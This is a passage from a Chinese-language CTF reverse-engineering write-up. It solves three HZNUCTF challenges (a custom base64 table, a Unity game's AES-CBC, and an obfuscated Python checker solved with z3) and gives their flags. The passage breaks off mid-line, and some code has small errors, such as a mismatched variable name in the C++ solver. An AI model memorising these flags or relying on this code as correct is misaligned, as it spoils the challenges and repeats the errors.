v9[v7 - 3] = v30[v28];\n    goto LABEL_37;\n  }\n  if ( v18 != 1 )\n  {\nLABEL_37:\n    v9[v7] = 0;\n    return v9;\n  }\n  v19 = a1 + (int)v2;\n  v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) - 40;\n  if ( (*(unsigned __int8 *)(v19 - 2) >> 2) + 24 <= 0x40u )\n    v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) + 24;\n  v9[v7 - 4] = v30[v20];\n  v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) - 40;\n  if ( ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3u))) + 24 <= 0x40 )\n    v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) + 24;\n  v9[v7 - 3] = v30[v21];\n  v22 = *(_BYTE *)(v19 - 1) & 0xF;\n  *(_WORD *)&v9[v7 - 1] = 61;\n  v23 = 4 * v22 + 24;\n  v24 = 4 * v22 - 40;\n  if ( v23 <= 0x40 )\n    v24 = v23;\n  v9[v7 - 2] = v30[v24];\n  return v9;\n}\n```\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar *base64_decode(const char *input)\n{\n    const char *base64_table = \"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\";\n\n    unsigned char reverse_table[256] = {0};\n    for (int i = 0; i < 64; i++)\n    {\n        reverse_table[(unsigned char)base64_table[i]] = i;\n    }\n\n    size_t input_len = strlen(input);\n    size_t padding = 0;\n\n    if (input_len > 0 && input[input_len - 1] == '=')\n    {\n        padding++;\n        if (input_len > 1 && input[input_len - 2] == '=')\n        {\n            padding++;\n        }\n    }\n\n    size_t output_len = (input_len * 3) / 4 - padding;\n    unsigned char *output = (unsigned char *)malloc(output_len + 1);\n    output[output_len] = 0;\n\n    size_t i = 0, j = 0;\n    while (i < input_len - padding)\n    {\n        unsigned char b1, b2, b3, b4;\n\n        unsigned char v1 = reverse_table[input[i++]];\n        unsigned char v2 = reverse_table[input[i++]];\n        unsigned char v3 = (i < input_len) ? reverse_table[input[i++]] : 0;\n        unsigned char v4 = (i < input_len) ? reverse_table[input[i++]] : 0;\n\n        b1 = (v1 > 24) ? (v1 - 24) : (v1 + 64 - 24);\n        b2 = (v2 > 24) ? (v2 - 24) : (v2 + 64 - 24);\n        b3 = (v3 > 24) ? (v3 - 24) : (v3 + 64 - 24);\n        b4 = (v4 > 24) ? (v4 - 24) : (v4 + 64 - 24);\n\n        if (j < output_len)\n            output[j++] = (b1 << 2) | (b2 >> 4);\n        if (j < output_len)\n            output[j++] = (b2 << 4) | (b3 >> 2);\n        if (j < output_len)\n            output[j++] = (b3 << 6) | b4;\n    }\n\n    return (char *)output;\n}\n\nint main()\n{\n    const char *Enc= \"AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\";\n    char *Decoded= base64_decode(Enc);\n    printf(\"%s\\n\", Decoded);\n    free(decoded);\n    return 0;\n}\n```\n\nHZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}\n\n### 水果忍者\n\n主要dll目录：\\水果忍者\\Fruit Ninja_Data\\Managed\\Assembly-CSharp.dll\n\n拖入dnSpy分析，是AES CBC加密。\n\n![img](/images/1744633170177-5.png)\n\n底下有密文、密钥、iv，直接解密即可。\n\n![img](/images/1744633170177-6.png)\n\n![img](/images/1744633170177-7.png)\n\nHZNUCTF{de20-70dd-4e62-b8d0-06e}\n\n### 蛇年的本命语言\n\npython程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。\n\n```python\nfrom collections import Counter\nprint(\"Welcome to HZNUCTF!!!\")\nprint(\"Plz input the flag:\")\nooo0oOoooOOO0 = input()\noOO0OoOoo000 = Counter(ooo0oOoooOOO0)\nO0o00 = \"\".join((str(oOO0OoOoo000[oOooo0OOO]) for oOooo0OOO in ooo0oOoooOOO0))\nprint(\"ans1: \", end=\"\")\nprint(O0o00)\nif O0o00 != \"111111116257645365477364777645752361\":\n    print(\"wrong_wrong!!!\")\n    exit(1)\niiIII = \"\"\nfor oOooo0OOO in ooo0oOoooOOO0:\n    if oOO0OoOoo000[oOooo0OOO] > 0:\n        iiIII += oOooo0OOO + str(oOO0OoOoo000[oOooo0OOO])\n        oOO0OoOoo000[oOooo0OOO] = 0\n    else:\n        i11i1Iii1I1 = [ord(oOooo0OOO) for oOooo0OOO in iiIII]\n        ii1iIi1i11i = [\n         7 * i11i1Iii1I1[0] == 504,\n         9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,\n         2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] == 799,\n         3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,\n         5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3] + 1 * i11i1Iii1I1[4] == 2042,\n         7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,\n         11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,\n         21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6] + 15 * i11i1Iii1I1[7] == 229,\n         2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4] + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,\n         10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8] + 30 * i11i1Iii1I1[9] == 4037,\n         15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,\n         13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4] + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6] + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] == 12544,\n         23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6] + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,\n         223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6] + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 13 * i11i1Iii1I1[13] == 6893,\n         29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3] + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8] + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10] + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12] + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,\n         69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3] + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12] + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] == 8257,\n         23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9] + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,\n         24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3] + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9] + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14] + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16] + 17 * i11i1Iii1I1[17] == 18257,\n         25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2] + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9] + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,\n         5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] + 19 * i11i1Iii1I1[19] == 52041,\n         29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1] + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18] + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,\n         45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] == 18768,\n         555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1] + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4] + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,\n         1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6] + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] == 159029,\n         520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,\n         1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] == 1551621,\n         777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,\n         97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] == 777044,\n         177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,\n         77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1] + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 2 * i11i1Iii1I1[28] + 29 * i11i1Iii1I1[29] == 130106]\n        if all(ii1iIi1i11i):\n            print(\"Congratulation!!!\")\n        else:\n            print(\"wrong_wrong!!!\")\n```\n\n是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，\n\n将下面的z3解出可以得到一个字符串**H1Z1N1U1C1T1F1{1a6d275f7-463}**\n\n一个字符一个数字配对，代表该字符在原flag中出现的次数。\n\n除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**\"111111116257645365477364777645752361\"**去一一对应。\n\n解密代码：\n\n```Python\nfrom z3 import *\n\ndef decrypt(encrypted):\n    mapping = \"6257645365477364777645752361\"\n    \n    char_map = {}\n\n    remaining_map = {\n        '6': 'a',\n        '2': 'd',\n        '5': '7',\n        '7': 'f',\n        '4': '-',\n        '3': '6',\n        '1': '}'\n    }\n    char_map.update(remaining_map)\n    \n    result = \"HZNUCTF{\"\n    for num in mapping:\n        result += char_map[num]\n    \n    return result\n\ns = Solver()\n\nEnc = [Int(f'x{i}') for i in range(30)]\n\ns.add(7 * Enc[0] == 504)\ns.add(9 * Enc[0] - 5 * Enc[1] == 403)\ns.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] == 799)\ns.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] == 2938)\ns.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] == 2042)\ns.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] == 1225)\ns.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] == 7975)\ns.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] == 229)\ns.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] == 2107)\ns.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] == 4037)\ns.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] == 4950)\ns.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] == 12544)\ns.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] == 6585)\ns.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] == 6893)\ns.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] == 1883)\ns.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] == 8257)\ns.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] == 5847)\ns.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] == 18257)\ns.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] == 12591)\ns.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] == 52041)\ns.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] == 20253)\ns.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] == 18768)\ns.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] == 111844)\ns.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * 